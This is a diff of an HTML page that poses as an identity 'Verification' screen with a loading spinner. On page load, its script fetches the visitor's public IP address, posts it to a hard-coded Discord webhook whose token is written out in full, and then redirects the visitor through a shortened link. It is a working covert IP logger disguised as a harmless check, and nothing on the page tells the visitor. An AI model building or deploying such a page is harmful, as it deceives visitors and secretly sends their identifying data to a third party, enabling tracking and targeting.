@@ -3,79 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Verification</title>
     <style>
+        /* General Body Styling */
         body {
-            background-color: black;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
             margin: 0;
             height: 100vh;
-            color: white;
-            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
-        }
-        .container {
             text-align: center;
         }
-        #loadingMessage {
-            font-size: 24px;
+
+        h1 {
+            font-size: 30px;
+            margin-bottom: 20px;
+        }
+
+        .loading-message {
+            font-size: 18px;
+        }
+
+        .loading-spinner {
             margin-top: 20px;
+            border: 4px solid transparent;
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Simple spinning animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive handling for small screens */
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 24px;
+            }
+
+            .loading-message {
+                font-size: 14px;
+            }
+
+            .loading-spinner {
+                width: 30px;
+                height: 30px;
+            }
         }
     </style>
+</head>
+<body>
+
+    <h1>Verifying...</h1>
+    <p class="loading-message" id="loadingMessage">Please wait while we verify your identity.</p>
+    <div class="loading-spinner"></div>
+
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your Discord webhook
-        const REDIRECT_URL = "https://is.gd/gwuu9c"; // Your redirect link
+        // Webhook URL - Replace with your actual Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
+        
+        // Redirect URL after delay
+        const REDIRECT_URL = "https://is.gd/gwuu9c";
 
+        // Log the status of the process for debugging purposes
+        function logStatus(message, isError = false) {
+            if (isError) {
+                console.error(message);
+            } else {
+                console.log(message);
+            }
+        }
+
+        // Main logic to handle IP fetch and webhook sending
         window.onload = async function() {
-            // Show loading message to the user
-            document.getElementById('loadingMessage').innerText = "Verifying... Please wait.";
-
             try {
-                // Fetch user's IP from a reliable API
-                const response = await fetch("https://api64.ip.sb/jsonip");
-                const data = await response.json();
-                const userIP = data.ip;
+                // Display message while fetching IP
+                document.getElementById('loadingMessage').innerText = 'Fetching your IP address...';
 
-                console.log("User IP: " + userIP); // Debugging: Check if the IP is fetched correctly
+                // Fetch the user's public IP address
+                const ipResponse = await fetch("https://api64.ip.sb/jsonip");
+                const ipData = await ipResponse.json();
 
-                // Send the IP to Discord webhook immediately after the page loads
+                if (!ipData.ip) {
+                    throw new Error('Unable to fetch IP address');
+                }
+
+                const userIP = ipData.ip;
+                logStatus(`Fetched IP address: ${userIP}`);
+
+                // Prepare payload for Discord webhook
                 const payload = {
                     content: `New Visitor IP: ${userIP}`
                 };
 
-                // Send request directly to the Discord webhook without a proxy
+                // Send the IP to the Discord webhook
                 const webhookResponse = await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                // Log the status of the webhook request
-                if (webhookResponse.ok) {
-                    console.log("Webhook request successful");
-                } else {
-                    console.error("Webhook request failed with status:", webhookResponse.status);
+                if (!webhookResponse.ok) {
+                    throw new Error(`Failed to send IP to Discord: ${webhookResponse.statusText}`);
                 }
 
-            } catch (error) {
-                console.error("Error sending IP:", error); // Improved error handling
-            }
+                logStatus('IP successfully sent to Discord webhook');
 
-            // Wait for 3 seconds before redirecting
-            setTimeout(function() {
-                window.location.href = REDIRECT_URL;
-            }, 3000); // 3 seconds delay
+                // Redirect the user after a delay of 3 seconds
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 3000); // Delay of 3 seconds
+
+            } catch (error) {
+                // Handle any errors that occur during the process
+                logStatus(`Error occurred: ${error.message}`, true);
+
+                // Optionally display a user-friendly message
+                document.getElementById('loadingMessage').innerText = 'Something went wrong. Please try again later.';
+            }
         };
     </script>
-</head>
-<body>
-    <div class="container">
-        <h1>Verifying...</h1>
-        <p id="loadingMessage">Please wait while we verify your identity.</p>
-    </div>
+
 </body>
 </html>
